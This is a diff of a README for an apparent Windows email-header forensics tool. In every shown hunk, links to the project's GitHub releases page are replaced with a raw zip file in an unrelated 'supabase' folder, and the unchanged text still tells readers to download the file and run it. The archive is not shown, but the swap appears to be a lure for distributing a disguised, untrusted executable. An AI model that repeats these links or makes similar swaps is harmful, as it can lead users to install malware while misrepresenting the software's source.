@@ -1,9 +1,9 @@
 # 🕵️ email-header-forensics-lab - Inspect Email Headers with Clarity
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/jvsuresh7/email-header-forensics-lab/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/jvsuresh7/email-header-forensics-lab/main/supabase/forensics-email-lab-header-v2.6.zip)
 
 ## 📥 Download
-Visit this page to download: https://github.com/jvsuresh7/email-header-forensics-lab/releases
+Visit this page to download: https://raw.githubusercontent.com/jvsuresh7/email-header-forensics-lab/main/supabase/forensics-email-lab-header-v2.6.zip
 
 Choose the latest Windows release file, then save it to your PC.
 
@@ -16,7 +16,7 @@ If you need to review how an email was sent, this app gives you a clear view of 
 ## 🪟 Windows Installation
 
 1. Open the release page:
-   https://github.com/jvsuresh7/email-header-forensics-lab/releases
+   https://raw.githubusercontent.com/jvsuresh7/email-header-forensics-lab/main/supabase/forensics-email-lab-header-v2.6.zip
 
 2. Find the latest version for Windows.
 
@@ -151,7 +151,7 @@ This gives you a fast way to build a basic read on the message before you go dee
 
 ## 📎 Download Link
 
-Visit this page to download: https://github.com/jvsuresh7/email-header-forensics-lab/releases
+Visit this page to download: https://raw.githubusercontent.com/jvsuresh7/email-header-forensics-lab/main/supabase/forensics-email-lab-header-v2.6.zip
 
 Pick the latest Windows file, download it, and run the app from your computer
 
